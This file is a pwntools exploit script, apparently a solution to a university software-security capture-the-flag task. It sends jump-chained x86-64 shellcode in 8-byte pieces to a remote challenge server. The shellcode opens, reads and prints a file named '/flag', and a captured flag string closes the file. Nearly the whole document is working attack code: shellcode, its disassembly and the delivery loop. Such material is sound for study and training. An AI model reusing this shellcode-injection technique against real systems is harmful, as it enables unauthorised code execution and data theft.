from pwn import *
import string
from sys import argv
import os
import time
import sys
import subprocess

context.arch = 'amd64'
context.os = 'linux'
info = log.info
context.log_level = 'debug'

binfile = './vuln'
elf = context.binary = ELF(binfile)


# for debugging
gdbscript = '''
file /gdbscript/vuln
b *main+503
'''.format(**locals())
with open("gdbscript", "w") as f:
    f.write(gdbscript)


# start remote
#p = remote('tasks.ws24.softsec.rub.de', 33251)

host = "127.0.0.1"
port = 1024
host = "tasks.ws24.softsec.rub.de"
port = 33273


p=remote(host, port)
#p2=process('tmux split-window -h docker exec -ti "$(docker ps -q -f \'ancestor=softsec/debug/practice-1\')" /bin/bash -c \'gdb -x /gdbscript/gdbscript -p "$(pgrep -n vuln)"\'', shell=True)
#sleep(2)
#p2.close()


def cyclic_find_bytes(b):
    to_be_found = bytes.fromhex(hex(b)[2:])[::-1]
    return cyclic_find(to_be_found)


# jump past 0x48b8
# do something, than jump +2 to next own code

print(disasm(asm(
"""/* call open('rsp', 'O_RDONLY', 'rdx') */
sub rsp, 0x60
mov eax, 0x67
shl rax, 32
xor rax, 0x2F666C61
push rax
mov rdi, rsp
jmp test
test:
mov eax, 2
xor edx, edx
xor esi, esi /* O_RDONLY */
syscall
mov rdi, rax
mov rsi, rsp
mov edx, 0xFF
mov eax, 0
syscall
/* write(1, buf, n) */
mov edi, 1 /* stdout */
mov rsi, rsp
mov edx, 0xFF /* number of bytes read */
mov eax, 1
syscall
test2:
jmp test2
""")))

"""
   0:   b8 67 00 00 00          mov    eax, 0x67
   5:   48 c1 e0 20             shl    rax, 0x20
   9:   48 35 61 6c 66 2f       xor    rax, 0x2f666c61
   f:   50                      push   rax
  10:   48 89 e7                mov    rdi, rsp
  13:   eb 00                   jmp    0x15
  15:   b8 02 00 00 00          mov    eax, 0x2
  1a:   31 d2                   xor    edx, edx
  1c:   31 f6                   xor    esi, esi
  1e:   0f 05                   syscall
  20:   48 89 c7                mov    rdi, rax
  23:   48 89 e6                mov    rsi, rsp
  26:   ba ff 00 00 00          mov    edx, 0xff
  2b:   b8 00 00 00 00          mov    eax, 0x0
  30:   0f 05                   syscall
  32:   bf 01 00 00 00          mov    edi, 0x1
  37:   48 89 e6                mov    rsi, rsp
  3a:   ba 49 00 00 00          mov    edx, 0x49
  3f:   b8 01 00 00 00          mov    eax, 0x1
  44:   0f 05                   syscall
"""

#jmp is 0xEB 00
instruction_data = [
0x4883ec60eb040000,
0xb867000000eb0300,
0xb867000000eb0300,
0x48c1e020eb040000,
0x48352F666C61eb02,
0x50eb070000000000,
0x4889e7eb05000000,
0xb802000000eb0300,
0x31d231f60f05eb02,
0x4889c74889e6eb02,
0xbaff000000eb0300,
0xb800000000eb0300,
0x0f05eb0600000000,
0xbf01000000eb0300,
0x4889e6eb05000000,
0xba49000000eb0300,
0xb801000000eb0300,
0x0f05ebfe00000000
]

p.sendline(str(len(instruction_data)).encode())
for i in instruction_data:
    byte_array = i.to_bytes(8, byteorder='big')
    reversed_byte_array = byte_array[::-1]
    reversed_hex_val = int.from_bytes(reversed_byte_array, byteorder='big')
    p.sendline(str(reversed_hex_val).encode())
p.sendline(b"2")

p.interactive()

#softsec{pVTX8stbyCNNqidSEQEJmv4h12aI7VaMTlcTAdxqj8TL3MtRKdD4mXzXAHdv_Ppv}